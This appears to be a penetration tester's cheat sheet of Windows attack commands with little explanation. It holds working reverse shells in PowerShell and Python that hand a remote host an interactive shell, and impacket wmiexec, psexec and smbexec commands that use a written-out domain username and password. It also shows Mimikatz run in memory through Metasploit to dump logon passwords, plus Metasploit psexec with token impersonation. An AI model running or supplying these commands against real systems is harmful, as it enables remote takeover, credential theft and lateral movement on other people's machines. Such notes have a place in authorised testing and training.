##### Powershell #reverseshell 

```powershell
# Powershell reverse shell # Scheduled task for example # powershell -enc <base 64 de la commande> 
$client = New-Object System.Net.Sockets.TCPClient("10.0.20.12",443);$stream = $client.GetStream();\ [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\ 	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\ 	$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";\ 	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\ 	$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

##### WMIexec #wmiexec #reverseshell
```bash
wmiexec is less noisy than psexec 
/usr/bin/impacket-wmiexec d.traya@192.168.56.102
```
##### psexec #psexec #reverseshell
```bash 
# psexec # Drosp a binary on the target → Noisy /usr/share/doc/python-impacket/examples/psexec.py GALACTIC/d.traya:triumvirat@192.168.56.102
```
##### smbexec #smb #reverseshell 
```
# smbexec /usr/share/doc/python-impacket/examples/smbexec.py GALACTIC/d.traya:triumvirat@192.168.56.102
```


### Mimikatz in RAM #Mimikatz #reverseshell

`# From MSF (execute Mimikatz in RAM) execute -H -i -c -m -d calc.exe -f /path/to/mimikatz.exe -a  '"privilege::debug" "sekurlsa::logonPasswords full" exit'` 

  

### Metasploit 

`# psexec msf5 > use exploit/windows/smb/psexec msf5 exploit(windows/smb/psexec) > set RHOSTS 10.69.88.100 msf5 exploit(windows/smb/psexec) > set SMBDomain GALACTIC.LAN msf5 exploit(windows/smb/psexec) > set SMBUSER d.traya msf5 exploit(windows/smb/psexec) > set SMBPASS triumvirat msf5 exploit(windows/smb/psexec) > run  # Impersonate user use incognito list_tokens -u impersonate_token <token> shell whoami`

#### Python Windows specific

```python
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```